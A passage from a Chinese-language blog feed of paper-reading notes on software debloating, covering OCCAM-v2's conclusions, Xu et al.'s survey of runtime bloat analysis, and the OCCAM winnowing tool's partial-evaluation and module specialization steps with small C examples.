未来方向</h3><ul><li><strong>后缀简化</strong><ul><li>在完成第一阶段后，内存快照包含两种类型的状态。<ul><li>第一种类型包括寄存器中的值，可以安全地用于简化后缀。这种简化包括使用LLVM内部的优化，以及由于Crab在配置的域上的抽象解释而可能的优化。</li><li>第二种类型包括内存中的值。为了使用这些值，有两种选择。一种方法识别通常情况下安全的特殊情况。第二种方法涉及使用指针分析以确保后缀简化的合理性。由于这会产生显著的计算成本，因此尚未纳入。在未来，可以添加对此的支持，用户将需要在愿意在特化过程中承担开销的情况下显式激活它。</li></ul></li></ul></li><li><strong>减少过度特化</strong><ul><li>DCA依赖一个事实，即前缀是目标应用程序将根据特定输入始终执行的路径。这种方法的好处在于，它承诺提供一种捕获外部输入的通用机制。当前的实现探索了一种策略，该策略默认假定这些值与从后缀中获得的值独立。然后，根据需要添加约束来处理违反该假设的特定情况。</li><li>例如，考虑快照中的一个变量，它是指向内存位置的指针。假设在动态分析过程中为其分配了一个具体值。如果它在程序的一个后缀中出现，它将不会被替换为常量。这是因为在运行时，该指针可能具有不同的值。在没有这些排除的情况下，生成的二进制将包含过度特化的实例，即错误的正面具体化。另一种策略是实施互补的方法：默认情况下假定值除非来自指定的输入，否则不能被具体化。</li></ul></li></ul><h3 id="7-%E7%BB%93%E8%AE%BA" tabindex="-1">7 结论</h3><ul><li>OCCAM-v2使用可扩展的指针分析，权值分析和动态分析创造了一个高效的特化工具，服务于LLVM位码。</li><li>所实现的代码大小减少取决于具体的部署配置。</li><li>每个需要特化的应用程序需要伴有一个清单，该清单制定了在运行时提供的已知的具体参数，以及在运行时需要提供的其它参数的数量。<ul><li>部分求值的最佳情况是当所有参数完全指定时</li></ul></li><li>OCCAM-v2使用指针分析来去除虚拟化调用，从而能够消除任何直接调用都无法到达的函数的整体。</li><li>混合分析特征可以处理对于静态分析有挑战的情况，例如输入循环，字符串处理和外部数据（如文件中的数据）。</li><li>在评估的程序集合中，OCCAM-v2平均能够将指令数减少40.6%,运行时间中位数2.4s</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (9)</title>
      <link href="/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(9)/"/>
      <url>/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(9)/</url>
      
        <content type="html"><![CDATA[<h2 id="(9)-software-bloat-analysis%3A-finding%2C-removing%2C-and-preventing-performance-problems-in-modern-large-scale-object-oriented-applications" tabindex="-1">(9) Software Bloat Analysis: Finding, Removing, and Preventing Performance Problems in Modern Large-Scale Object-Oriented Applications</h2><p>Xu G, Mitchell N, Arnold M, et al. Software bloat analysis: Finding, removing, and preventing performance problems in modern large-scale object-oriented applications[C], Proceedings of the FSE/SDP workshop on Future of software engineering research. 2010: 421-426.</p><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><p>我们将解释软件膨胀的原因,解析软件膨胀分析现状,为未来的工作提供帮助</p><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li><p>Myhrvold 的定律:</p><ul><li>Software is a gas. Software always expands to fit whatever container it is stored in.</li><li>Software grows until it becomes limited by Moore’s law. The growth of software is initially rapid, like gas expanding, but is inevitably limited by the rate of increase in hardware speed.</li><li>Software growth makes Moore’s law possible. People buy new hardware because the software requires it.</li><li>Software is limited only by human ambition and expectation. We will always find new algorithms, new applications, and new users.</li></ul></li><li><p><strong>运行时膨胀</strong></p><ul><li>许多情况下是大型程序性能问题的根源,并不是硬件速度不够快,而是软件膨胀导致的</li><li>两种运行时膨胀<ul><li>内存膨胀:空间效率低下<ul><li>如Java程序中内存泄漏,因保留了不再使用的引用,尽管不影响程序的执行,但会消耗堆空间最后导致程序崩溃</li></ul></li><li>执行膨胀:执行了不必要的操作<ul><li>如在算法/设计上选择不恰当,在大型数据库中使用冒泡排序而不是快排等</li></ul></li></ul></li></ul></li><li><p><strong>多CPU带来的影响</strong></p><ul><li>随着核数增加,膨胀问题更痛苦</li><li>因为每个核心的平均内存带块下降,CPU性能的提升远高于内存带宽的提升</li></ul></li><li><p><strong>为什么是一个软件工程问题</strong></p><ul><li>解决膨胀问题的方法可以涵盖开发的所有阶段</li><li>程序员被教导使用抽象和模式,来重用代码和代码可读性,此时性能会交给编译器和运行时系统,如 即时编译器 JIT 和 垃圾回收期 GC. 但当抽象变得深层和嵌套,优化器将会吃力. 这里就需要对 效率和通用的权衡</li><li>膨胀的定义是相对的,如果存在更优的方法,那么目前的方法就是膨胀的. 发现膨胀可以被视为一个测试问题,来对实现进行效率评估</li><li>发现膨胀后,下一步是去除,程序分析可以发挥作用消除膨胀</li><li>在长期研究中,膨涨分析成为 资源约束 程序 的关键任务,因为这样的程序是移动计算的主流</li></ul></li></ul><h3 id="2-sota" tabindex="-1">2 SOTA</h3><p>介绍SOTA膨涨分析和面临的挑战</p><h4 id="2.1-%E5%8F%97%E7%AE%A1%E5%88%B6%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F" tabindex="-1">2.1 受管制语言中的内存泄漏</h4><ul><li>managed language: 管制语言,有运行时垃圾回收的语言</li><li>静态分析可以检测内存泄漏,但会受到 可伸缩和精确的 引用/对模型,反射,多线程等问题限制,因此实践中更多使用动态分析来识别内存泄漏</li><li>目前大多数工作采用&quot;从症状到原因&quot;的诊断方法,寻找可疑对象,随后从这些对象中找到泄漏的原因.<ul><li>可疑对象和原因的检测都是基于启发式的<ul><li>如[23,17]的工作使用某些类型实例数量的增加作为泄露对象的指示器</li><li>[16,4,25]的工作则识别一段时间没有使用的陈旧对象</li></ul></li><li>接下来从可疑对象后续遍历对象图来定位原因,然而启发式的限制在于 如果存在大量对象和极其复杂的引用关系时的不准确性</li><li>为了克服这个问题,来自[40]的工作采用了一种以容器为中心的视图,通过建模和分析容器行为来检测泄漏. 该方法基于一个重要观察结果,即Java中许多内存泄漏是由于对容器的误用,因此这项工作的局限在于,不是由容器引起的泄漏将被忽略.</li></ul></li><li>与Java内存泄漏相关研究还包括:开发能够将陈旧对象交换到磁盘[5,36] 或 仅回收极不可能再次使用的对象[6]. 这些技术可以保持性能和稳定性,从而在内存泄漏的情况下延长运行时间</li></ul><h4 id="2.2-%E5%AD%98%E5%82%A8%E8%86%A8%E8%83%80%E6%A3%80%E6%B5%8B" tabindex="-1">2.2 存储膨胀检测</h4><ul><li>[24]的工作引入健康签名来评估一个应用程序是否在必要的内存消耗和数据结构内存开销之间取得了良好的平衡。该工作的重点是Java集合对象。<ul><li>如,分析显示,一个包含2字符字符串的HashMap将其29%的空间用于指针开销，而HashSet对象的开销甚至可能更高</li><li>报告显示了一个实际应用程序，将其74%的内存用于集合的固定和每个元素的成本，这个百分比足以引起我们采取措施来避免膨胀。</li></ul></li></ul><h4 id="2.3-%E8%BF%90%E8%A1%8C%E8%86%A8%E8%83%80%E6%A3%80%E6%B5%8B" tabindex="-1">2.3 运行膨胀检测</h4><ul><li><p>大多数检测执行膨胀的工作都基于膨胀表现出的副作用（即可疑行为）。已经考虑的副作用类别包括大量的临时（短暂）对象、纯堆值拷贝和不适当的容器行为。</p></li><li><p><strong>临时对象</strong></p><ul><li>[9] 提出混合问题分析技术,对动态收集的调用结果区 进行静态分析以观察性能问题</li><li>[27]开发了一种基于JVM的工具Jolt,识别出使用大量临时对象的区域,该工具强制JVM中的JIT在这些区域执行激进的方法内联,仪表JIT可以找到更多的优化机会</li></ul></li><li><p><strong>纯拷贝</strong></p><ul><li>没有计算的序列纯堆拷贝 很可能出现多于操作</li><li>如 相同数据多个表示的存在,这些表示会不断的进行包装和解包</li><li>[38]的工作提出了一种拷贝分析方式,通过识别拷贝密集的区域来检测膨胀,已经证明这对于准确定位具有直接从其他数据结构复制数据的堆数据结构是有帮助的</li></ul></li><li><p><strong>容器膨胀</strong></p><ul><li>膨胀的一个重要来源是对容器的不当使用.</li><li>不同类型和实现的容器是为不同的使用场景设计的，因此在不了解其成本和收益的情况下选择容器可能导致显著的内存和执行膨胀。<ul><li>如HashSet适用于存储大量元素并提供快速成员测试，如果元素数量相对较小，则不应使用</li></ul></li><li>[26]提出了一种动态技术,该技术对程序进行分析以提出容器选择建议</li><li>[41]识别了两种特定类型的容器效率低下，即未充分利用的容器和过度填充的容器。该工作提出了第一种用于识别膨胀的静态分析：这种分析自动提取容器语义，不需要用户注释。</li><li>[39]的工作提出了一种动态成本和效益分析，通过捕获构造昂贵但对前向执行效益低的数据结构来检测膨胀</li></ul></li><li><p><strong>膨胀移除</strong></p><ul><li>在构建和初始化跨循环迭代保持不变的数据结构方面可能非常昂贵。</li><li>我们目前在进行一项静态分析,试图将这种数据结构提升出循环。该分析工作在两个方面展开：<ul><li>首先识别循环不变的逻辑数据结构，然后通过尝试提升访问它的语句来检查是否可以提升。</li><li>对于不能安全提升的数据结构，它计算提升可行性的度量，并呈现给用户进行进一步检查</li></ul></li></ul></li><li><p>尽管我们的工作取得了一些进展,但仍有以下三个挑战</p></li><li><p><strong>挑战1:动态分析的准确性</strong></p><ul><li>动态膨胀检测器生成的报告有大量误报,几乎所有的动态检测器都有这样的问题,因为很难定义 一个选择规则,来描述问题程序实体的唯一特征</li><li>可能的解决方案是将我们的期望从检测一般类别的问题降低到一个非常具体的类别，对于该类别可以定义更精确的症状,如[40]的工作,这一小类问题经常出现,以便可以忽略其它问题</li></ul></li><li><p><strong>挑战2:静态和动态分析的对比</strong></p><ul><li>[41]中的容器效率检测使用静态分析来检测动态分析的报错率,因为静态分析可以利用代表程序员意图或程序中固有错误的源代码属性.</li><li>传统中的测试和调试中,动态分析更精确,而在检测膨胀时,静态分析更精确.<ul><li>这种差异来自对分析的不同用途,即推断和用于检查</li><li>尚待研究的是是否有其它类型的膨胀检测或混合使用</li></ul></li></ul></li><li><p><strong>挑战3:基于规范的膨胀检测</strong></p><ul><li>现有工具不够精确的主要原因是缺乏定义膨胀的精确规范</li><li>如果在开发过程中使用一些规范,膨胀检测可以更容易</li><li>这种规范可以弥合非功能性性能分析与现有检查和测试程序功能属性的大量工作之间的差距，从而使完全自动化性能调整过程成为可能。</li></ul></li></ul><h3 id="3-%E6%9C%AA%E6%9D%A5%E6%96%B9%E5%90%91" tabindex="-1">3 未来方向</h3><h4 id="thin-patterns" tabindex="-1">Thin patterns</h4><ul><li>尽管设计模式[10] 在编写易于管理的代码方面很成功,但也是许多 运行时膨胀的根本原因<ul><li>如访问者模式,需要使用内部类表示不同的访问者,而这些访问者只有一个visit方法,会被实例化很多次,并且创建的对象都是相同的:它们没有数据,仅用于动态调度.</li></ul></li><li>未来关于模式的研究可能为现有模式创建一些专业化版本(如thin patterns),意在 达到效率和模块化之间的权衡</li><li>编译器方面,可以基于模式的特征进行进一步优化</li></ul><h4 id="%E6%B3%A8%E9%87%8D%E6%80%A7%E8%83%BD%E7%9A%84%E5%BB%BA%E6%A8%A1%E8%AF%AD%E8%A8%80%E5%92%8C%E5%B7%A5%E5%85%B7" tabindex="-1">注重性能的建模语言和工具</h4><ul><li>目前的许多性能设计集中在高层次的体系结构和流程而不是程序效率问题</li><li>因此,未来的工作可能会将性能建模语言和工具集成到现有的软件工程实践中,以便在设计阶段就可以考虑性能问题</li><li>粗心的设计会导致显著的运行时膨胀,特别是当使用建模工具后自动生成代码框架时<ul><li>如,当建模时粗心的关联会导致膨胀,考虑几个类之间的关系,这些关系包括方向性和多重性,尽管代码上有等效的实现,但却忽视了其性能影响. 更多的时候,程序员根本没有注意,只是建模工具选择默认的数据模型</li></ul></li></ul><h4 id="%E5%8D%95%E5%85%83%E6%A3%80%E6%B5%8B%2F%E8%86%A8%E8%83%80%E6%A3%80%E6%B5%8B" tabindex="-1">单元检测/膨胀检测</h4><ul><li>在早期的开发阶段就开始避免低效是很重要的,以防止低效的累积,这就需要新颖的程序分析和测试技术</li><li>目前如何使得单元测试验证非功能属性尚不清楚<ul><li>如,不容器为单元测试写断言,因单元级的冗余不明显</li></ul></li><li>但这其实本质困难是: 非功能性规范问题. 除了运行时间和空间,还能对性能做哪些断言?<ul><li>好的规范必须与某种膨胀问题密切相关，而不仅仅描述问题表现出的症状。</li><li>如果设计和评估了这样的规范，性能分析的研究可能会取得显著的进展。</li></ul></li></ul><h4 id="%E8%87%AA%E5%8A%A8%E5%8C%96%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%A8%8B%E5%BA%8F%E5%90%88%E6%88%90" tabindex="-1">自动化系统和程序合成</h4><ul><li>JVM中基于反馈的编译技术可能足够强大，可以在执行期间减少“大堆积” [20]<ul><li>例如,动态对象内联可能是减少指针开销的有效方法</li></ul></li><li>为了消除容器的低效性，运行时系统可以在观察到大部分空间未被使用时自动缩小为容器分配的空间</li><li>程序合成的最新进展为解决执行膨胀问题带来了新的希望。<ul><li>在给定用户定义的规范的情况下，程序合成工具可以自动从算法空间中选择最有效的算法。</li><li>这可以自然地应用于膨胀检测的研究中，以找到高效的实现，并且可能进一步用于生成满足性能要求的性能关键任务的实现。</li></ul></li></ul><h3 id="4-%E7%BB%93%E8%AE%BA" tabindex="-1">4 结论</h3><ul><li>论文中,我们描述了软件膨胀，这是一个逐渐对大规模面向对象应用产生负面影响的新兴问题.</li><li>我们认为这本质上是一个软件工程问题，是时候让软件工程社区为其提供新的解决方案了。</li><li>我们对一些现有的膨胀分析工作进行了调查，描述了其中的挑战，并勾勒了一些有前景的未来方向</li><li>我们相信，软件工程社区有比以往任何时候都更大的机会使软件更加高效，而这完全可以在应用程序级别实现，无需依赖不断增强的硬件能力。</li></ul><h2 id="(10)-occam%3Aautomated-software-winnowing%C2%B7" tabindex="-1">(10) OCCAM:Automated Software Winnowing·</h2><p>Malecha G, Gehani A, Shankar N. Automated software winnowing[C],Proceedings of the 30th Annual ACM Symposium on Applied Computing. 2015: 1504-1511.</p><p>SAC’15 April 13-17, 2015, Salamanca, Spain<br>Symposium on Applied Computing 2015</p><p><img src="https://github.com/SRI-CSL/OCCAM" alt="开源地址"></p><h3 id="0-%E6%91%98%E8%A6%81-1" tabindex="-1">0 摘要</h3><ul><li>为了解决代码膨胀问题,我们介绍一个OCCAM工具.<ul><li>OCCAM结合了部分求值和类型理论的技术，旨在减少部署应用中的代码。</li><li>OCCAM可以在不对程序源代码进行注释或以其他方式修改的情况下使用。</li><li>它利用配置时间信息生成一个根据将要部署的上下文进行专门定制的应用程序版本。</li></ul></li><li>我们介绍了我们的算法、实现和实验评估。</li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D-1" tabindex="-1">1 介绍</h3><ul><li>模块化软件库 通过为图形,文件操作和网络提供 可复用功能,使得编写复杂应用更加容易,然而,为了实现通用性,库往往比应用程序所需要的功能更多<ul><li>如 libpng[10]提供了复杂的接口进行图像转换,但许多都用不到</li></ul></li><li>这个问题也涉及了软件栈的多个层次,由跨层依赖引入的开销<ul><li>如 miniblog[13]运行在PHP上,而PHP历来与libc,libc中许多函数仅被miniblog不使用的PHP代码使用. 这些函数包含在静态链接的二进制文件中,存储在磁盘中,执行期间需要内存,多余的代码甚至会被反向导向编程利用</li></ul></li><li>尽管大多数系统不是资源限制的,但 目前普遍的实现中,即使是 二进制文件中 不用的功能 和共享库也会影响性能,可靠性和安全.<ul><li>为此,我们提出了一种将代码特化到实际使用中并简化掉未使用功能的方法</li></ul></li><li>我们提出了 winnnowing(筛选),一种使用部分求值的静态分析和代码特化工具<ul><li>该过程保留了原始程序的正常语义,即原始程序在指定输入上的行为与精简程序的行为相同</li><li>无效的执行,如缓冲区溢出,会以不同方式执行</li></ul></li><li>在基本层次上,程序的功能对应于潜在的执行的适量,如C标准库中的socket函数</li></ul><pre><code class="language-C">int socket(int domain, int type, int protocol);</code></pre><ul><li>该函数接收3个int值,有大量潜在行为,但大多数组合不会被特定程序使用.<ul><li>如Web 服务器通常打开AF_INET和AF_INET6套接字，但不需要AF_APPLETALK或AF_ATMPVC套接字。</li><li>Winnowing的目标是从软件堆栈中删除未使用的行为,减少需要分析的代码,同时保留需要的功能</li></ul></li></ul><h4 id="%E5%8A%A8%E6%9C%BA" tabindex="-1">动机</h4><ul><li><p>筛选部署二进制文件的4个原因</p></li><li><p><strong>专用服务器</strong>:虚拟机的出现使得 高度专业化的服务器称为常态</p><ul><li>如Web服务器通常仅托管单个站点,而虚拟机中过于通用的库只会引入代码膨胀,即虚拟机之间的隔离破坏了共享代码的好处</li></ul></li><li><p><strong>自定义库</strong></p><ul><li>在嵌入式平台上,能够简化库,意味着开发人员可以通过删除不用的功能以使用更大更成熟的库.</li><li>许多应用程序在提供 编译时配置 来移除大块代码. 然而这种方法又开发者定义而不是使用者,因此对开发人员来说增加了维护不同构建配置的负担</li><li>上述方法也无法提供对应用程序获取内容的精确控制<ul><li>如,即使是间接地使用大型组件中的单个函数,也需要整个组件的存在</li><li>此外,为管理员增加了工作量,因为他们必须及时更新系统,这会涉及与应用程序无关的补丁,因为很难确定应用程序是否使用了有缺陷的函数,尤其在使用动态语言时</li></ul></li></ul></li><li><p><strong>简化分析</strong></p><ul><li>在安全重要的系统中,含有大型库是一种负担</li><li>更小的应用程序,较少的配置选项,更少更通用功能的库,更容易进行静态分析.</li><li>此外,部分估值的代码通常更简单,使得静态分析对上下文感知更有效</li></ul></li><li><p><strong>二进制多样性</strong></p><ul><li>专用库使得缓冲区溢出更难以利用</li><li>PHP等平台在可预测的地方包含相同的功能集</li><li>特化每个应用的部署实例,不仅可以移除不需要的功能,还可以移动和改变遗留的功能. 这对剩余功能的攻击更加困难</li></ul></li></ul><h4 id="%E8%B4%A1%E7%8C%AE" tabindex="-1">贡献</h4><ul><li><p>我们讨论了简化单个应用程序的思想和方法,我们的方法对所有同质的应用程序是相同的,即所有代码都可以编译成LLVM[7]位码格式的应用程序.</p></li><li><p>我们选择LLVM框架,因为该框架包括几种流行语言的前端,包括C,C++,Java,其有着明确的中间表示,支持静态和动态编译</p></li><li><p>我们的工作提供了以下内容</p><ul><li>一种用于大幅减少代码功能(包括库和应用程序)的工具. 可以用于实际的大型,工业程序中</li><li>一种将外部信息纳入简化过程的模块化方法. 这可以来用执行策略,如&quot;不应调用邮件&quot;或&quot;系统只能用字符串 ls 调用&quot;,类似面向切面的编程</li><li>关于 简化 对 二进制大小 和 执行性能 影响的 实质分析. 结果标明,简化的二进制文件在性能上没有额外的开销,根据不同的应用程序可以显著减少二进制文件的大小</li><li>一种工具 透明地增强大型软件项目的比那一过程,如Php,SQLite,以生成LLVM为嘛和本机目标文件</li></ul></li></ul><h3 id="2-winnowing" tabindex="-1">2 winnowing</h3><p>本节介绍了我们的方法的一个实例<br>2.1 描述筛选一个单独的编译片段,用LLVM调用模块<br>2.2 描述多模块筛选,使之可在更大的库和动态加载中使用</p><h4 id="2.1-%E6%A8%A1%E5%9D%97%E5%86%85%E7%B2%BE%E7%AE%80" tabindex="-1">2.1 模块内精简</h4><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_1.png" alt></p><ul><li>LLVM的基本编译单元是模块,对于简单的程序,通常包含在一个单独的模块中,此时可以用上图的方法进行简化程序<ul><li>下面以简化C语言正则表达式库为例(仅使用C进行说明,所有的分析和转换都在LLVM位码上进行)</li></ul></li></ul><pre><code class="language-C">int regcomp ( regex_t ∗preg , const char ∗regex ,int cflags )&#123; /∗ . . . regcomp code . . . ∗/ &#125;void main ( int argc , char∗ argv[ ] ) &#123;  regex_t re;  regcomp (&amp;re,argv[1] , REG_EXTENDED|REG_ICASE ) ;  . . .&#125;</code></pre><ul><li><p>算法过程如下</p></li><li><p><strong>0. 编译</strong>:将源码编译为LLVM位码. 第三部分将讨论我们的工具,他能自动化的构建LLVM位码,通过指导构建Unix系统的脚本,如GNU的自动化工具</p></li><li><p><strong>1. 部分估值</strong>:winnower的核心是部分估值器,由两个阶段组成,winnower交错并迭代执行这两个阶段</p><ul><li><strong>1.1 优化</strong>:<ul><li>部分求值始于简化代码。其目标是暴露在编译时可确定的常量，消除死代码，并减少已知的控制流。将部分求值器应用于我们的代码片段将减少按位或运算，得到以下结果：<pre><code class="language-C">void main ( int argc , char∗ argv[ ] ) &#123;  regex_t re;  regcomp (&amp;re,argv[1] , REG_EXTENDED|REG_ICASE ) ;  . . .&#125;</code></pre></li><li>正如 Fujita [2] 和 Smowton [12] 所指出的那样，LLVM 优化器的激进性使其成为一个合理的程序内部部分求值器。</li><li>我们使用LLVM的 -O3 优化配置文件,包含了一些列简化,如 局数值编号、启发式循环展开、稀疏条件常数传播、常数折叠以及已知函数简化（简化对 libc 函数的调用，如 strlen 和 memcpy）。此优化传递还对局部函数执行一些保守的程序间优化，例如内联小函数和消除未使用的参数。</li></ul></li><li><strong>1.2 特化</strong><ul><li>优化阶段后,使用启发式方法 更 激进地在跨函数边界进行特化,在这个过程中寻找编译时已知参数的函数调用. 例如,regcomp的最后一个参数指定选项,如不区分大小写或是否支持扩展正则表达式. 该选项在编译时已知,因此可以进行特化,用已知的常量进行替代,删除不需要的参数<pre><code class="language-C">int regcomp ( regex_t ∗preg , const char ∗regex  )&#123; /∗ . . . regcomp with cflags=3 . . . ∗/ &#125;</code></pre></li><li>再将优化运用到这个特化后的函数上,可以通过简化对cflags的分支语句来删除四代码,还有可能将常量推送到其它参数的位置上,进行更进一步地特化</li><li>如果原始地使用,这两个阶段的迭代可能会增加代码的大小,但可以通过各种启发式方法来控制这一点.<ul><li>一种启发式方法是仅在未特化版本可以删除时特化函数,这个启发式方法完全对应减少功能的情况,是一种理想情况</li><li>实际上,我们发现 需要更激进地进行特化,以揭示有益的低级特化. 我们目前的启发式方法是贪婪的,只要看到一个支持的常量就进行特化,同时忽略可变参数函数.  除了整数之外，我们的专门化过程还支持浮点数、常量字符串、任何类型的空值以及全局变量和函数的地址。</li></ul></li><li><strong>递归</strong>:函数特化的主要困难是调用图中的循环,如果没有递归,我们可以限制特化的数量,因为我们指导LLVM优化器不会无限展开训话,然而,在有递归的情况下,我们必须检测特化何时会发散,考虑如下简单递归函数<pre><code class="language-C">int foo(int start,int end)&#123;  if(start&gt;end)&#123;return start-end;&#125;  return foo(start+1,end);&#125;int bar(ing x)&#123;  return foo(1,x);&#125;//特化后int foo_1(int end)&#123;  if(1&gt;end)&#123;return 1-end;&#125;  return foo_1(2,end);&#125;</code></pre><ul><li>此时foo_1(2,end)仍然可以特化,此时特化将无法停止,因为不知道end的值. 因此我们当前的实现选择不特化递归函数.</li><li>值得注意的是,部分评估器通过实践绑定分析[1,5]解决了这个问题,同时确实存在递归函数的部分评估技术[4]</li></ul></li></ul></li></ul></li><li><p><strong>2 消除</strong>:在部分评估稳定,或二进制文件变得过大而无法处理时,我们会删除不再需要的内部全局变量.</p><ul><li>在优化删除无法访问的代码时,全局变量可能变得没用.如果全局函数被特化,并且其所有被调用的位置都可以被特化的实例替代,则将删除这些全局函数.</li><li>我们使用LLVM的三个优化器实现了这个阶段: globaldce, globalopt, strip-dead-prototypes</li></ul></li><li><p><strong>3 链接</strong>:在迭代到固定点之后，我们使用 LLVM 工具将精简后的代码链接在一起构建二进制文件。这</p></li><li><p>模块内的简化算法构建了输入模块的语义等效版本，同时努力消除不必要的功能。</p></li><li><p>该算法可应用于任何单个编译单元，包括静态库和共享对象，因为它不通过删除导出的函数或更改其名称或类型来修改外部可见接口（在 LLVM 的抽象层面）。</p></li><li><p>然而，部分评估可能会极大地改变程序的内部结构，使得在代码中未表现的监控行为（如堆栈检查）失效。</p></li></ul><h4 id="2.2-%E6%A8%A1%E5%9D%97%E9%97%B4%E7%B2%BE%E7%AE%80" tabindex="-1">2.2 模块间精简</h4><ul><li>模块内精简效果好,因为大多数应用程序可以在精简之前通过静态链接库构建为单个模块。,但大型程序必须要与共享库进行交互,因此需要模块间精简</li><li>跨模块的精简的难点在于 代码的分离 和 维护兼容的二进制接口. 此外,我们希望特化是可重用的.<ul><li>如,我们会构建标准库的自定义版本,该版本通过仅包含这些应用程序所需的功能来支持多个应用程序。</li><li>然后，我们希望能够自动重写客户端应用程序以重用相同的精简库</li></ul></li><li>原理上,我们将模块间精简分为三个任务<ul><li>2.2.1 计算模块间依赖关系,使模块间的独立精简称为可能</li><li>2.2.2 对模块进行特化,</li><li>2.2.3 根据生成的规范进行重写</li><li>2.2.4 封存模块,隐藏其它模块未使用的符号,以便在链接时优化期间消除未使用的函数</li></ul></li><li>简化构成迭代 模块特化和封存 步骤,以产生完整的二进制文件</li><li>处于解释目的,我们考虑特化以下简单的代码片段，其中 bar 是在另一个模块中实现的。</li></ul><pre><code class="language-C">extern void bar(int,int);int main(int argc, char* argv[])&#123;  bar(argc,5);  bar(2,argc);  return 0;&#125;</code></pre><h5 id="2.2.1-%E4%BE%9D%E8%B5%96%E8%AE%A1%E7%AE%97" tabindex="-1">2.2.1 依赖计算</h5><ul><li>核心的组合机制是计算和使用模块的（函数和全局变量）依赖关系。<ul><li>在但模块内 简化时,有bar的代码可以立即特化</li><li>此时bar在另一个模块中定义,我们只能将foo记录未客户端模块的依赖</li></ul></li><li>为了对函数进行有意义的特化,我们需要知道关于参数值的信息。我们使用单例类型系统来表达这些信息 [8,16]。<ul><li>单例类型系统支持使用相等谓词对类型进行细化. 例如C 类型系统只能表达变量 x 是整数（int x）。使用单例类型，我们可以细化这个类型，不仅说明 x 是一个整数，而且其值为 5（int=5 x）。因此，我们简单程序的依赖关系如下：<pre><code class="language-C">bar(int=?, int=5)// 使用int=?表示未知的int值bar(int=2, int=?)</code></pre></li></ul></li><li>为了计算一个模块的依赖项,我们从模块的入口遍历调用图,并寻找外部符号引用.<ul><li>直接引用和调用点很简单；我们确定目标函数并记录信息</li><li>间接函数调用和函数指针则更为复杂。我们依赖于 LLVM 工具计算调用图，这些工具采用标准的程序分析技术，如别名分析和控制流和数据流分析。这些分析提高了 OCCAM 解析间接函数调用的能力。<ul><li>当我们无法静态确定调用的目标时，我们必须记录对每个可能的目标函数的最一般化（即未特化）调用。这是因为我们可能在不进行全局代码重写情况下,更改二进制接口。例如，如果代码将 bar 的地址存储在函数指针中，我们必须保守地记录最一般的依赖关系：</li></ul></li><li>在某些情况下，模块内部剔除期间进行的部分评估将简化这个结构，使我们能够静态解析函数。虽然这阻止了进一步的特化，但在一般情况下是不可避免的，例如，当被特化的程序在表中查找函数指针时。</li></ul></li><li>要计算整个应用程序的依赖项，我们从包含程序入口点的模块开始，并遍历代码链接的库，如下图所示。为了处理循环模块依赖的一般情况，我们迭代这个过程，直到后续的依赖计算不产生额外的依赖项<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_2.png" alt="image"></li></ul><h5 id="2.2.2-%E7%89%B9%E5%8C%96" tabindex="-1">2.2.2 特化</h5><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_3.png" alt="image"></p><ul><li>特化,使用每个客户模块的依赖性来决定要特化的函数</li><li>如上图示,遍历依赖文件中的调用列表，确定是否以及如何特化每个函数。函数特化的工作方式与模块内情况相同</li><li>即，复制函数体，删除常量参数，并将它们替换为函数体中。</li><li>区别在,与模块内简化不同,我们无法访问函数调用点以重写它们来调用专门的函数. 因此,我们生成了一份重写规范,详细说明客户端如何修改以使用更具体地接口.</li><li>以之前bar的特化举例,生成以下重写,此时只需调用一个参数</li></ul><pre><code class="language-C">&quot;bar&quot;(int=?1, int=5) -&gt; &quot;bar_x_5&quot;(int=?1)&quot;bar&quot;(int=2, int=?2) -&gt; &quot;bar_2_x&quot;(int=?2)</code></pre><h5 id="2.2.3-%E9%87%8D%E5%86%99" tabindex="-1">2.2.3 重写</h5><ul><li>特化后,使用重写规范更新客户端模块. 我们遍历所有外部定义函数的调用点,并查找与调用点匹配的最精确的重写,更新调用点以使用新的函数名和参数</li><li>例如之前的例子变为</li></ul><pre><code class="language-C">int main(int argc, char* argv[])&#123;  bar_x_5(argc);  bar_2_x(argc);  return 0;&#125;</code></pre><ul><li>特化步骤不会删除任何未特化的函数,因为不匹配任何规则的调用点将继续调用未专门化的函数</li><li>重写本质上与模块内特化修改调用者相同,但需要向模块内添加新的函数原型,并从重写规范中重新读取.</li><li>因为我们没有修改通用函数的数显,因此我们可以安全地忽略间接调用和将外部符号存储在变量中</li></ul><h5 id="2.2.4-%E5%B0%81%E5%AD%98" tabindex="-1">2.2.4 封存</h5><ul><li><p>重写完成后，模块内和跨模块的消除即可等效。在此步骤中，我们将对外部世界没有直接引用的符号变为内部，有效地覆盖了其他模块可以与我们的模块进行交互的漏洞。这允许模块内精简删除不可达代码并更激进地优化函数，因为它可以静态分析所有潜在的调用点。</p></li><li><p>使用我们的接口，封装模块非常简单，如下图所示。我们只需迭代所有外部符号，并将任何未在接口中引用的符号变为内部。值得注意的是，拥有准确的接口对于此步骤的正确性至关重要，因为如果我们尝试在另一个模块中引用内部符号，链接将失败。</p></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_4.png" alt="image"></p><h4 id="2.3-%E5%8A%A8%E6%80%81%E6%A3%80%E6%9F%A5" 